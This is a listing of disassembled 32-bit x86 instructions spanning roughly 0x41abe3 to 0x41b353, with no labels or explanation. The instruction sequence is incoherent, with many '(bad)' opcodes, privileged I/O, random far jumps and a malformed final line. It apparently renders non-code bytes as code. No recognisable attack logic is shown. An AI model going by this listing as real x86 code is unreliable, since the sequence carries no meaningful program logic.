  41abe3:	sbb    BYTE PTR [edi+0x1568f0e2],0xf8
  41abea:	pop    esp
  41abeb:	sahf   
  41abec:	mov    bl,0x7
  41abee:	lahf   
  41abef:	cmp    eax,0x9515530b
  41abf4:	xchg   esp,eax
  41abf5:	and    BYTE PTR [edi+eiz*4-0x76],al
  41abf9:	scas   al,BYTE PTR es:[edi]
  41abfa:	inc    esi
  41abfb:	ins    DWORD PTR es:[edi],dx
  41abfc:	or     BYTE PTR [ebx],bh
  41abfe:	fadd   DWORD PTR [edx+0x3bd6ec4c]
  41ac04:	je     0x41abe1
  41ac06:	lods   eax,DWORD PTR ds:[esi]
  41ac07:	push   0x24
  41ac09:	lods   eax,DWORD PTR ds:[esi]
  41ac0a:	xor    al,ch
  41ac0c:	ror    BYTE PTR [edi+esi*1-0x2bae8c0b],1
  41ac13:	mov    ds:0x1d913794,al
  41ac18:	out    dx,eax
  41ac19:	inc    edi
  41ac1a:	push   cs
  41ac1b:	rol    DWORD PTR [edi+0x7],cl
  41ac1e:	add    esi,DWORD PTR [ecx]
  41ac20:	push   cs
  41ac21:	popa   
  41ac22:	inc    ebx
  41ac23:	mov    eax,ds:0xbde41de
  41ac28:	js     0x41ac78
  41ac2a:	mov    ch,0x3d
  41ac2c:	push   esi
  41ac2d:	or     eax,0xe0ab26d7
  41ac32:	sub    al,0x76
  41ac34:	cmp    al,0x19
  41ac36:	std    
  41ac37:	adc    DWORD PTR [ebx-0x7c],ebx
  41ac3a:	shl    BYTE PTR [eax-0x7f],1
  41ac3d:	icebp  
  41ac3e:	aad    0xe2
  41ac40:	mov    bh,0x2a
  41ac42:	pop    esi
  41ac43:	stc    
  41ac44:	dec    edi
  41ac45:	mov    al,0x6b
  41ac47:	jl     0x41abcd
  41ac49:	jge    0x41ac46
  41ac4b:	pop    ecx
  41ac4c:	mov    dh,0xeb
  41ac4e:	xchg   edi,eax
  41ac4f:	or     BYTE PTR [esp+ecx*4],dl
  41ac52:	(bad)  
  41ac53:	aas    
  41ac54:	out    0xf,al
  41ac56:	jb     0x41ac42
  41ac58:	push   ss
  41ac59:	cmp    cl,BYTE PTR [edx]
  41ac5b:	pop    es
  41ac5c:	or     DWORD PTR ds:0x1a6f9b65,0x59
  41ac63:	push   0xffffffd1
  41ac65:	test   al,0xe8
  41ac67:	cld    
  41ac68:	fs stos BYTE PTR es:[edi],al
  41ac6a:	pushf  
  41ac6b:	pop    esi
  41ac6c:	std    
  41ac6d:	fnstenv [ebx+0x63941512]
  41ac73:	das    
  41ac74:	inc    eax
  41ac75:	lea    ecx,[ebp+0x7]
  41ac78:	stc    
  41ac79:	push   0xd5d6e7cf
  41ac7e:	push   esi
  41ac7f:	mov    cl,0xd3
  41ac81:	xchg   DWORD PTR [ecx+0x6f21437a],esp
  41ac87:	mov    ebx,0x1f52f50c
  41ac8c:	push   ebp
  41ac8d:	push   esi
  41ac8e:	nop
  41ac8f:	inc    ecx
  41ac90:	das    
  41ac91:	mov    eax,eax
  41ac93:	dec    esp
  41ac94:	pop    esi
  41ac95:	int3   
  41ac96:	es dec esp
  41ac98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac99:	iret   
  41ac9a:	jp     0x41ace9
  41ac9c:	idiv   ebx
  41ac9e:	sbb    ebx,esp
  41aca0:	mov    ds:0x813bc10e,al
  41aca5:	(bad)  
  41aca7:	loop   0x41acdc
  41aca9:	add    BYTE PTR [edx+0x1e723352],0x1d
  41acb0:	adc    dh,dh
  41acb2:	sbb    dl,ch
  41acb4:	adc    eax,0x753f51e4
  41acb9:	out    dx,eax
  41acba:	and    dl,bh
  41acbc:	push   edi
  41acbd:	or     DWORD PTR [esi-0x6b34fbde],esi
  41acc3:	jns    0x41ac58
  41acc5:	or     DWORD PTR [ebx-0x5540503f],esi
  41accb:	mov    BYTE PTR [edx-0x6907f04d],al
  41acd1:	pop    ebx
  41acd2:	mov    ch,0x79
  41acd4:	mov    edx,0xf5297fff
  41acd9:	cmp    esi,edi
  41acdb:	jmp    0x41ad55
  41acdd:	outs   dx,DWORD PTR ds:[esi]
  41acde:	and    ebp,DWORD PTR [ebx+0x2]
  41ace1:	and    ch,al
  41ace3:	sbb    al,0x6a
  41ace5:	out    0x9a,eax
  41ace7:	mov    dl,0x4e
  41ace9:	push   ebx
  41acea:	pusha  
  41aceb:	xchg   dh,bh
  41aced:	mov    dh,0x23
  41acef:	add    eax,0xec0cc7e9
  41acf4:	push   edx
  41acf5:	jb     0x41acb8
  41acf7:	stc    
  41acf8:	add    BYTE PTR [ecx+0x51],0xd5
  41acfc:	xchg   edi,eax
  41acfd:	pop    esi
  41acfe:	xchg   ebp,eax
  41acff:	mov    es,WORD PTR [esi]
  41ad01:	imul   eax,ecx,0x437a5d0d
  41ad07:	pop    esi
  41ad08:	fcom   st(0)
  41ad0a:	mov    esp,edi
  41ad0c:	mov    bl,bl
  41ad0e:	add    eax,0xa1b6c93b
  41ad13:	and    ebx,0x32414cfd
  41ad19:	es mov ebx,0x1053115
  41ad20:	xchg   DWORD PTR [ecx-0x422d6565],ebx
  41ad26:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41ad28:	gs (bad) 
  41ad2a:	leave  
  41ad2b:	dec    esp
  41ad2c:	jp     0x41ad8a
  41ad2e:	call   ecx
  41ad30:	inc    eax
  41ad31:	ja     0x41acf5
  41ad33:	loopne 0x41ad14
  41ad35:	ss inc ebx
  41ad37:	dec    esp
  41ad38:	dec    edx
  41ad39:	pop    ebp
  41ad3a:	popf   
  41ad3b:	fcmovbe st,st(6)
  41ad3d:	add    eax,0x5db347b8
  41ad42:	das    
  41ad43:	(bad)  
  41ad45:	add    eax,esi
  41ad47:	and    dl,BYTE PTR [edi-0x5c]
  41ad4a:	cs cmp ebp,edx
  41ad4d:	test   dh,bl
  41ad4f:	push   es
  41ad50:	sbb    BYTE PTR ds:0x58fb9fd,cl
  41ad56:	shl    dl,cl
  41ad58:	jo     0x41ada9
  41ad5a:	out    dx,al
  41ad5b:	popa   
  41ad5c:	or     ch,cl
  41ad5e:	mov    edi,0xc4875cce
  41ad63:	mov    ah,0xe8
  41ad65:	pop    edi
  41ad66:	inc    ebx
  41ad67:	pop    ebp
  41ad68:	bswap  edx
  41ad6a:	inc    edi
  41ad6b:	xchg   edi,eax
  41ad6c:	sbb    eax,0xc4eb81fe
  41ad71:	into   
  41ad72:	and    BYTE PTR [esi-0x62],ch
  41ad75:	and    BYTE PTR [eax-0x32],ah
  41ad78:	(bad)  
  41ad7a:	in     al,dx
  41ad7b:	mov    WORD PTR [esi-0x3bf03268],cs
  41ad81:	or     BYTE PTR [eax-0xde6c41d],dh
  41ad87:	enter  0xb3e3,0xc
  41ad8b:	call   0xeaec:0x1f7649d6
  41ad92:	add    cl,dl
  41ad94:	iret   
  41ad95:	aam    0xc5
  41ad97:	in     eax,0xee
  41ad99:	mov    edx,0xda1fe65a
  41ad9e:	popf   
  41ad9f:	dec    edi
  41ada0:	pusha  
  41ada1:	sub    eax,0x5d2d5a05
  41ada6:	and    eax,0x6f034fc7
  41adab:	ins    DWORD PTR es:[edi],dx
  41adac:	lock dec esi
  41adae:	push   0xe770c6bc
  41adb3:	inc    eax
  41adb4:	test   dh,cl
  41adb6:	aaa    
  41adb7:	mov    ebp,0x2d90c9cb
  41adbc:	cmpxchg DWORD PTR [esi],ecx
  41adbf:	jbe    0x41adc6
  41adc1:	sub    DWORD PTR [ebx+0x53729006],edx
  41adc7:	mov    bh,0xed
  41adc9:	xor    BYTE PTR [ecx-0x59],0xdc
  41adcd:	and    DWORD PTR [esi-0x4f360656],esp
  41add3:	stos   DWORD PTR es:[edi],eax
  41add4:	add    eax,0xb5edbb1f
  41add9:	cwde   
  41adda:	xchg   ebp,eax
  41addb:	xchg   ebx,eax
  41addc:	add    ebp,DWORD PTR [esp+eax*4-0x3e7a60ef]
  41ade3:	popf   
  41ade4:	test   eax,0x6eb22aae
  41ade9:	pushf  
  41adea:	mov    ah,0x8b
  41adec:	mov    esi,0xb7afd32e
  41adf1:	jl     0x41adab
  41adf3:	inc    edi
  41adf4:	sub    BYTE PTR [esp+edi*4],bl
  41adf7:	in     eax,dx
  41adf8:	test   BYTE PTR [edx-0x30],bl
  41adfb:	es clc 
  41adfd:	jle    0x41adba
  41adff:	mov    al,ds:0x50707713
  41ae04:	dec    ecx
  41ae05:	mov    edi,0x6a00b440
  41ae0a:	test   DWORD PTR [edx],edi
  41ae0c:	retf   
  41ae0d:	mov    ebx,0xbd3482df
  41ae12:	push   edi
  41ae13:	inc    esp
  41ae14:	lahf   
  41ae15:	lea    ecx,[ebp+0x6d23f8fc]
  41ae1b:	xor    al,BYTE PTR [esi-0x48b7fd66]
  41ae21:	sub    al,0x49
  41ae23:	loopne 0x41ae7b
  41ae25:	(bad)  
  41ae26:	jmp    0x9c987bd0
  41ae2b:	fild   QWORD PTR [edi+0x5d90079d]
  41ae31:	jae    0x41ae7d
  41ae33:	loopne 0x41add3
  41ae35:	rcr    BYTE PTR [ecx+0x62],1
  41ae38:	jbe    0x41ae42
  41ae3a:	xchg   ebp,eax
  41ae3b:	add    DWORD PTR [edx],ecx
  41ae3d:	test   eax,0xfb12af5b
  41ae42:	(bad)  
  41ae43:	jmp    0x293327d8
  41ae48:	retf   
  41ae49:	loopne 0x41aeb7
  41ae4b:	mov    eax,0x7b959f4b
  41ae50:	push   eax
  41ae51:	sbb    BYTE PTR [edi-0x77],al
  41ae54:	fbld   TBYTE PTR [ebp+0x1f7a8aee]
  41ae5a:	pop    esi
  41ae5b:	inc    ebx
  41ae5c:	or     BYTE PTR [esi],0xf2
  41ae5f:	add    BYTE PTR [esi+0x54],dh
  41ae62:	call   0x8632:0x81a40cb8
  41ae69:	jg     0x41ae9e
  41ae6b:	retf   0xec88
  41ae6e:	jno    0x41ae36
  41ae70:	xchg   ebp,eax
  41ae71:	jmp    0x41ae8b
  41ae73:	arpl   WORD PTR [esi+0x34922cd3],dx
  41ae79:	in     al,0xea
  41ae7b:	add    eax,0xe4a87c4b
  41ae80:	inc    edi
  41ae81:	push   edx
  41ae82:	dec    esi
  41ae83:	ins    BYTE PTR es:[edi],dx
  41ae84:	xor    al,0xb2
  41ae86:	jl     0x8dc5cf63
  41ae8c:	and    ecx,DWORD PTR [edx+0x50]
  41ae8f:	(bad)  
  41ae90:	xor    al,0xa1
  41ae92:	mov    ebx,0x9b6b9e47
  41ae97:	cld    
  41ae98:	push   ecx
  41ae99:	adc    BYTE PTR [edi+0x10],al
  41ae9c:	loopne 0x41aeeb
  41ae9e:	mov    bh,0x39
  41aea0:	out    0x13,eax
  41aea2:	push   eax
  41aea3:	inc    esi
  41aea4:	add    DWORD PTR [eax-0x30a5b0e],ecx
  41aeaa:	inc    edi
  41aeab:	xchg   ecx,eax
  41aeac:	jnp    0x41ae54
  41aeae:	mov    edx,0x1132d18e
  41aeb3:	jns    0x41af0e
  41aeb5:	dec    eax
  41aeb6:	sub    BYTE PTR [esp+ecx*4+0x1e],dl
  41aeba:	test   BYTE PTR [edx+ebx*2],dh
  41aebd:	in     eax,dx
  41aebe:	jmp    0x8207e1ca
  41aec3:	jbe    0x41aeab
  41aec5:	add    eax,0x777b4d94
  41aeca:	add    ebx,edx
  41aecc:	and    eax,esi
  41aece:	or     al,0x99
  41aed0:	sbb    BYTE PTR [eax],bl
  41aed2:	or     al,0x41
  41aed4:	loope  0x41ae6d
  41aed6:	rcr    DWORD PTR [edi],cl
  41aed8:	pop    ebx
  41aed9:	scas   eax,DWORD PTR es:[edi]
  41aeda:	nop    DWORD PTR ss:[edi+0x5a]
  41aedf:	xor    ecx,DWORD PTR es:[edx+0x32]
  41aee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aee4:	or     DWORD PTR [esi+edi*8+0x42477217],esi
  41aeeb:	mov    ss,WORD PTR [eax+ecx*8-0x50]
  41aeef:	sub    BYTE PTR [ebx],dh
  41aef1:	sub    BYTE PTR [edx-0x10],bl
  41aef4:	jecxz  0x41af65
  41aef6:	std    
  41aef7:	enter  0x9e1b,0x3b
  41aefb:	inc    eax
  41aefc:	enter  0x6181,0x2
  41af00:	push   cs
  41af01:	cmp    BYTE PTR [ebp-0x5b2eb9e6],0x69
  41af08:	or     bh,dl
  41af0a:	imul   DWORD PTR [edx+0x5f19db74]
  41af10:	cs stc 
  41af12:	in     al,dx
  41af13:	mov    esp,0x21f15bf3
  41af18:	dec    edi
  41af19:	loope  0x41aeb4
  41af1b:	daa    
  41af1c:	or     ebx,DWORD PTR [esi]
  41af1e:	mov    eax,0x47aa8f9
  41af23:	out    0x0,al
  41af25:	jmp    FWORD PTR [ecx-0xe286de4]
  41af2b:	xor    BYTE PTR [ecx+0x66],cl
  41af2e:	jl     0x41aeec
  41af30:	mov    ds:0xf4255803,al
  41af35:	and    edi,DWORD PTR [edi]
  41af37:	mov    bh,0x24
  41af39:	into   
  41af3a:	int3   
  41af3b:	pop    ss
  41af3c:	pop    bx
  41af3e:	ret    
  41af3f:	mov    eax,ds:0xdd40c38f
  41af44:	mov    al,0x36
  41af46:	push   ecx
  41af47:	sbb    ecx,DWORD PTR [edi-0x1da47010]
  41af4d:	stos   BYTE PTR es:[edi],al
  41af4e:	xchg   ebx,eax
  41af4f:	imul   ebx,DWORD PTR [edx],0xef99f4af
  41af55:	sub    ebp,DWORD PTR [edx-0x56]
  41af58:	push   cs
  41af59:	or     ebx,ecx
  41af5b:	mov    dl,0xda
  41af5d:	jb     0x41af5d
  41af5f:	push   edi
  41af60:	mov    ch,0xa2
  41af62:	jmp    0x53fd:0xccc85f25
  41af69:	xchg   DWORD PTR [edx+0x56],edx
  41af6c:	push   0x78df9d38
  41af71:	adc    eax,0x7911c56c
  41af76:	adc    ebp,edi
  41af78:	int3   
  41af79:	pop    eax
  41af7a:	sbb    eax,0xd1dbc679
  41af7f:	pushf  
  41af80:	mov    edi,0x7beb44dd
  41af85:	inc    ecx
  41af86:	loope  0x41af73
  41af88:	xor    dh,dh
  41af8a:	out    dx,eax
  41af8b:	ror    BYTE PTR [ebx-0x20],1
  41af8e:	inc    ecx
  41af8f:	xchg   ebp,eax
  41af90:	out    dx,al
  41af91:	sub    ch,bl
  41af93:	jl     0x41afd4
  41af95:	xchg   ecx,eax
  41af96:	cld    
  41af97:	aaa    
  41af98:	xchg   DWORD PTR [esi],ecx
  41af9a:	lods   al,BYTE PTR ds:[esi]
  41af9b:	lea    edx,[eax-0x7ecbf7d0]
  41afa1:	and    BYTE PTR [edi+0x27],dl
  41afa4:	(bad)  
  41afa5:	out    dx,eax
  41afa6:	or     edx,ebp
  41afa8:	mov    ecx,0xe146103d
  41afad:	add    BYTE PTR [edi-0x12cab62f],ch
  41afb3:	mov    DWORD PTR [edi],esp
  41afb5:	rcr    DWORD PTR [edx+eax*8],1
  41afb8:	inc    ecx
  41afb9:	cld    
  41afba:	push   ecx
  41afbb:	cmp    cl,BYTE PTR [eiz*4+0x22f70adc]
  41afc2:	cmp    al,0xf7
  41afc4:	adc    DWORD PTR [esi+ebx*4+0x7a7ea9dc],esp
  41afcb:	and    eax,0x91a3ead5
  41afd0:	(bad)  
  41afd2:	or     eax,DWORD PTR [edi+edx*4]
  41afd5:	imul   ebx,esp,0xffffff8e
  41afd8:	add    dl,BYTE PTR es:[ecx+0x67502ae8]
  41afdf:	call   0x158f:0x9e7129b9
  41afe6:	xchg   ebx,eax
  41afe7:	out    0xf0,eax
  41afe9:	mov    edx,0x8a3d6b96
  41afee:	dec    edx
  41afef:	lods   al,BYTE PTR ds:[esi]
  41aff0:	sbb    cl,BYTE PTR [edi+0x1656c939]
  41aff6:	stos   BYTE PTR es:[edi],al
  41aff7:	or     eax,DWORD PTR [edi-0x33e5ba89]
  41affd:	xchg   BYTE PTR [ecx],ah
  41afff:	jmp    0xf102b71
  41b004:	inc    edx
  41b005:	and    eax,0xb7f9e908
  41b00a:	jo     0x41b066
  41b00c:	test   DWORD PTR [ebx+0x5c8accbb],ebp
  41b012:	pop    ecx
  41b013:	lds    esp,FWORD PTR [edx]
  41b015:	imul   edi,DWORD PTR [esi-0x13],0x663de820
  41b01c:	pop    ebx
  41b01d:	aaa    
  41b01e:	xor    al,0x78
  41b020:	icebp  
  41b021:	push   ebp
  41b022:	rcr    DWORD PTR [ecx+0x7d],1
  41b025:	call   FWORD PTR [esi-0x3c5051b]
  41b02b:	cmp    al,0x36
  41b02d:	jae    0x41afd2
  41b02f:	imul   ah
  41b031:	sahf   
  41b032:	adc    al,0x73
  41b034:	rdmsr  
  41b036:	jl     0x41afb8
  41b038:	mov    DWORD PTR [ebx-0x3a],edi
  41b03b:	mov    ch,0xbd
  41b03d:	and    dh,BYTE PTR [eax+0x5b]
  41b040:	aaa    
  41b041:	rcr    BYTE PTR [eax-0x7818558],1
  41b047:	adc    bh,BYTE PTR ds:0x266d8063
  41b04d:	fwait
  41b04e:	xlat   BYTE PTR ds:[ebx]
  41b04f:	jnp    0x41b069
  41b051:	(bad)  
  41b052:	jecxz  0x41b0d0
  41b054:	aaa    
  41b055:	adc    BYTE PTR [edi],cl
  41b057:	call   0xcbd9:0x60309f02
  41b05e:	pop    ebx
  41b05f:	push   esi
  41b060:	cmp    edx,edi
  41b062:	pop    es
  41b063:	xchg   esi,eax
  41b064:	clc    
  41b065:	je     0x41b013
  41b067:	in     eax,dx
  41b068:	adc    al,0x9a
  41b06a:	jecxz  0x41b01b
  41b06c:	adc    dl,dh
  41b06e:	call   0x3a04:0xafbe7697
  41b075:	push   esp
  41b076:	jp     0x41b044
  41b078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b079:	pop    esp
  41b07a:	jge    0x41b014
  41b07c:	rcr    DWORD PTR [eax+0x7705b4fa],cl
  41b082:	or     al,0xc7
  41b084:	hlt    
  41b085:	jns    0x41b0e8
  41b087:	js     0x41b052
  41b089:	loop   0x41b0cf
  41b08b:	rcl    esi,0xb7
  41b08e:	pusha  
  41b08f:	jb     0x41b0d4
  41b091:	arpl   WORD PTR [esi-0x1a55a621],sp
  41b097:	dec    edx
  41b098:	not    DWORD PTR [edx-0x805f1e8]
  41b09e:	cmp    BYTE PTR [eax-0xd],bh
  41b0a1:	mov    ds:0xe9ea133,eax
  41b0a6:	inc    esp
  41b0a7:	test   al,dh
  41b0a9:	mov    esp,0xddbffda0
  41b0ae:	in     al,0x6d
  41b0b0:	mov    edx,0x735eca5e
  41b0b5:	xchg   ebp,eax
  41b0b6:	jmp    0x41b097
  41b0b8:	push   ss
  41b0b9:	mov    ds:0xea538c0a,al
  41b0be:	sub    bl,BYTE PTR [esi+0x27]
  41b0c1:	sub    eax,0x69b793fd
  41b0c6:	pop    eax
  41b0c7:	pop    ebp
  41b0c8:	push   edx
  41b0c9:	pop    esi
  41b0ca:	xor    ecx,esi
  41b0cc:	mov    eax,ds:0x810414fa
  41b0d1:	jae    0x41b0bc
  41b0d3:	mov    ebx,0xa8606c3e
  41b0d8:	dec    edi
  41b0d9:	jne    0x41b157
  41b0db:	xchg   ebx,eax
  41b0dc:	(bad)  
  41b0de:	inc    ebp
  41b0df:	dec    eax
  41b0e0:	leave  
  41b0e1:	icebp  
  41b0e2:	and    al,dl
  41b0e4:	inc    edi
  41b0e5:	xchg   ebx,eax
  41b0e6:	xchg   edi,eax
  41b0e7:	xchg   edx,eax
  41b0e8:	xchg   DWORD PTR [ebp-0x37],ebp
  41b0eb:	fld    TBYTE PTR [ecx-0x5e]
  41b0ee:	ror    DWORD PTR [eax],cl
  41b0f0:	icebp  
  41b0f1:	mov    WORD PTR [eax-0x79],es
  41b0f4:	cmp    al,0xdf
  41b0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f7:	mov    ebp,DWORD PTR [ecx+0x56065bf7]
  41b0fd:	push   edi
  41b0fe:	mov    ch,0x8c
  41b100:	imul   ebp
  41b102:	leave  
  41b103:	aas    
  41b104:	rcl    DWORD PTR [ecx],1
  41b106:	scas   al,BYTE PTR es:[edi]
  41b107:	dec    ebp
  41b108:	daa    
  41b109:	inc    edi
  41b10a:	jb     0x41b151
  41b10c:	stos   DWORD PTR es:[edi],eax
  41b10d:	loop   0x41b09d
  41b10f:	or     ah,dh
  41b111:	or     bl,BYTE PTR [esi+0x2e6fa3e7]
  41b117:	xor    DWORD PTR [ebp+ecx*4+0x75],ecx
  41b11b:	imul   edi,DWORD PTR [ebp+0x3],0x8
  41b11f:	add    dh,BYTE PTR [ecx-0x3fb19e2a]
  41b125:	iret   
  41b126:	into   
  41b127:	xchg   ebp,eax
  41b128:	shl    BYTE PTR [edx-0x1a964a66],0xd8
  41b12f:	in     eax,0x9c
  41b131:	push   0xffffff80
  41b133:	and    al,0xb4
  41b135:	dec    eax
  41b136:	mov    eax,ds:0xf1cef71
  41b13b:	out    dx,eax
  41b13c:	sub    bl,al
  41b13e:	xor    esp,DWORD PTR [esi+0x10ffd6f4]
  41b144:	scas   al,BYTE PTR es:[edi]
  41b145:	mov    ds,WORD PTR [esi]
  41b147:	out    0x7d,al
  41b149:	stos   BYTE PTR es:[edi],al
  41b14a:	or     dl,BYTE PTR cs:[edx-0x7e]
  41b14e:	mov    cl,0x6a
  41b150:	clc    
  41b151:	xchg   ecx,eax
  41b152:	jle    0x41b0de
  41b154:	cdq    
  41b155:	jnp    0x41b14e
  41b157:	scas   al,BYTE PTR es:[edi]
  41b158:	rcl    DWORD PTR [edi],1
  41b15a:	out    0x7c,al
  41b15c:	ffree  st(4)
  41b15e:	or     DWORD PTR [eax],0x73
  41b161:	outs   dx,DWORD PTR ds:[esi]
  41b162:	and    eax,esi
  41b164:	mov    al,ds:0x9162a572
  41b169:	inc    edx
  41b16a:	and    al,0x5a
  41b16c:	icebp  
  41b16d:	adc    ax,0x2538
  41b171:	loopne 0x41b121
  41b173:	ret    
  41b174:	mov    bl,0x32
  41b176:	sbb    ecx,0x1
  41b179:	dec    eax
  41b17a:	mov    esi,0x610377dd
  41b17f:	adc    eax,0xc1a69664
  41b184:	out    dx,al
  41b185:	mov    ds:0x580ef53d,al
  41b18a:	jno    0x41b1f5
  41b18c:	and    al,BYTE PTR [edx]
  41b18e:	inc    edx
  41b18f:	jl     0x41b1c4
  41b191:	inc    esp
  41b192:	fisttp QWORD PTR [ecx+0x4c6ed707]
  41b198:	cmp    BYTE PTR [ecx-0x2c],0xe5
  41b19c:	es aaa 
  41b19e:	in     eax,0xf
  41b1a0:	shl    DWORD PTR [esp+eiz*8],0xdd
  41b1a4:	xchg   esi,eax
  41b1a5:	inc    edx
  41b1a6:	inc    edi
  41b1a7:	outs   dx,DWORD PTR ds:[esi]
  41b1a8:	sbb    BYTE PTR [ebx+ebx*2-0x6e],bl
  41b1ac:	fcmovbe st,st(2)
  41b1ae:	sub    ah,BYTE PTR [eax-0x56]
  41b1b1:	enter  0xda8d,0x44
  41b1b5:	fsubr  QWORD PTR [ebx-0x68a28ccf]
  41b1bb:	jl     0x41b238
  41b1bd:	ss (bad) 
  41b1bf:	test   al,0x4
  41b1c1:	xor    dh,bl
  41b1c3:	jmp    DWORD PTR [ecx-0x1c81616d]
  41b1c9:	mov    BYTE PTR [ecx],ah
  41b1cb:	mov    esi,0x31d09743
  41b1d0:	retf   0xde6e
  41b1d3:	pop    ebx
  41b1d4:	test   eax,0xb68f0eb2
  41b1d9:	inc    eax
  41b1da:	cmp    dh,BYTE PTR [ebx-0x1abd3f41]
  41b1e0:	or     al,0xef
  41b1e2:	cs loop 0x41b199
  41b1e5:	xchg   edi,eax
  41b1e6:	ins    DWORD PTR es:[edi],dx
  41b1e7:	xor    eax,DWORD PTR [edi]
  41b1e9:	jg     0x41b1ab
  41b1eb:	adc    DWORD PTR [eax-0x6a582c1c],esp
  41b1f1:	or     eax,0xda5c48e5
  41b1f6:	das    
  41b1f7:	cld    
  41b1f8:	inc    ecx
  41b1f9:	add    ch,BYTE PTR [ebx]
  41b1fb:	sub    bl,bl
  41b1fd:	or     BYTE PTR [ecx+0x22ca29f7],0xb4
  41b204:	sub    ah,BYTE PTR [edi]
  41b206:	xchg   DWORD PTR [ebx-0x5c0092fe],esp
  41b20c:	(bad)  
  41b20e:	pop    ebp
  41b20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b210:	shl    BYTE PTR [edi+ecx*1+0xc4f6634],0xa8
  41b218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b219:	pop    edi
  41b21a:	icebp  
  41b21b:	pop    ss
  41b21c:	shl    DWORD PTR [ebp-0x35],1
  41b21f:	(bad)  
  41b220:	push   cs
  41b221:	arpl   bp,si
  41b223:	jl     0x41b206
  41b225:	(bad)  
  41b226:	push   ecx
  41b227:	jle    0x41b269
  41b229:	adc    ah,bh
  41b22b:	mov    bh,0xa0
  41b22d:	jmp    0x4714:0x70feebd4
  41b234:	jg     0x41b2b5
  41b236:	mov    bh,0x63
  41b238:	out    0x4c,al
  41b23a:	ss popa 
  41b23c:	ins    DWORD PTR es:[edi],dx
  41b23d:	leave  
  41b23e:	jle    0x41b1cb
  41b240:	dec    eax
  41b241:	fwait
  41b242:	dec    ecx
  41b243:	xchg   BYTE PTR [edi-0x6e4d1310],bl
  41b249:	fcom   st(5)
  41b24b:	mov    esi,ecx
  41b24d:	mov    edx,0x7b20f869
  41b252:	jg     0x41b211
  41b254:	pop    ds
  41b255:	pop    ds
  41b256:	dec    ebx
  41b257:	cwd    
  41b259:	dec    ebx
  41b25a:	enter  0x1dcd,0xa1
  41b25e:	cwde   
  41b25f:	adc    al,0xda
  41b261:	push   ds
  41b262:	xor    al,0x92
  41b264:	test   al,0xd2
  41b266:	dec    edx
  41b267:	rcr    dh,cl
  41b269:	loope  0x41b1ef
  41b26b:	pop    ebp
  41b26c:	sbb    eax,0x88cc5cf0
  41b271:	ror    BYTE PTR [edx],cl
  41b273:	cmp    al,0x1a
  41b275:	shl    BYTE PTR [edi+0x9],cl
  41b278:	ins    DWORD PTR es:[edi],dx
  41b279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27a:	pop    es
  41b27b:	pop    edx
  41b27c:	popa   
  41b27d:	(bad)  [ebx]
  41b27f:	pop    esp
  41b280:	cmp    bl,BYTE PTR [esp+edx*2-0x2f4bce07]
  41b287:	jmp    0xba06e3e2
  41b28c:	(bad)  
  41b28d:	mov    cl,0xda
  41b28f:	das    
  41b290:	xor    DWORD PTR [edx-0x79a9cc6b],ebx
  41b296:	fisubr DWORD PTR [ebx-0x72]
  41b299:	fdiv   DWORD PTR [edi-0x56]
  41b29c:	push   ebp
  41b29d:	and    bl,BYTE PTR [edi+ebx*4+0x3f9b7912]
  41b2a4:	ja     0x41b26e
  41b2a6:	das    
  41b2a7:	lods   al,BYTE PTR ds:[esi]
  41b2a8:	lods   eax,DWORD PTR ds:[esi]
  41b2a9:	mov    al,0x10
  41b2ab:	sbb    DWORD PTR [ebx],edx
  41b2ad:	or     esi,DWORD PTR [eax-0x478079e2]
  41b2b3:	xlat   BYTE PTR ds:[ebx]
  41b2b4:	pop    ebp
  41b2b5:	jmp    0x41bf:0x5362c86d
  41b2bc:	in     al,dx
  41b2bd:	jno    0x41b249
  41b2bf:	loope  0x41b28e
  41b2c1:	xchg   ebp,eax
  41b2c2:	hlt    
  41b2c3:	push   edi
  41b2c4:	pop    ecx
  41b2c5:	stos   BYTE PTR es:[edi],al
  41b2c6:	not    DWORD PTR [esi-0x34ecac8e]
  41b2cc:	loopne 0x41b314
  41b2ce:	lahf   
  41b2cf:	in     eax,dx
  41b2d0:	mov    al,ds:0x8f3d7b32
  41b2d5:	ret    
  41b2d6:	jo     0x41b2c6
  41b2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d9:	adc    DWORD PTR [ebx],ecx
  41b2db:	pop    edx
  41b2dc:	cld    
  41b2dd:	lods   eax,DWORD PTR ds:[esi]
  41b2de:	retf   0xe2e0
  41b2e1:	cmp    bl,ch
  41b2e3:	adc    ecx,DWORD PTR [edx-0x36b6b41a]
  41b2e9:	push   ss
  41b2ea:	ja     0x41b29e
  41b2ec:	sbb    ebx,ebx
  41b2ee:	lock mov esi,0xf9d90c77
  41b2f4:	out    dx,eax
  41b2f5:	or     eax,0x118653a8
  41b2fa:	icebp  
  41b2fb:	cmp    eax,0xbfcaf225
  41b300:	dec    edi
  41b301:	and    al,0xc2
  41b303:	retf   0xc403
  41b306:	fcom   st(0)
  41b308:	js     0x41b339
  41b30a:	mov    al,ds:0xab33b616
  41b30f:	push   esp
  41b310:	adc    al,0xb
  41b312:	cwde   
  41b313:	pushf  
  41b314:	shl    BYTE PTR [ecx-0x7d],0x1e
  41b318:	push   ss
  41b319:	in     al,0xf3
  41b31b:	cli    
  41b31c:	xor    BYTE PTR [esi-0x72df476a],dh
  41b322:	lds    ebx,FWORD PTR [eax]
  41b324:	ror    BYTE PTR [edi+edx*1+0x75],cl
  41b328:	jnp    0x41b386
  41b32a:	clc    
  41b32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b32c:	fwait
  41b32d:	and    ebx,DWORD PTR [esp+ecx*2-0x1f]
  41b331:	sbb    BYTE PTR [edi+0x23df565c],al
  41b337:	pop    ecx
  41b338:	arpl   WORD PTR [esi],cx
  41b33a:	arpl   bx,dx
  41b33c:	test   dl,dl
  41b33e:	cmp    DWORD PTR [esi-0x70cb43e3],ecx
  41b344:	retf   0x9458
  41b347:	loopne 0x41b3c8
  41b349:	sbb    ebp,ebx
  41b34b:	mov    eax,?
  41b34d:	pop    esi
  41b34e:	mov    ebx,0xca2a5cfb
  41b353:	imul   esp,DWORD PTR [edx-0x66],0xe7abb6f2
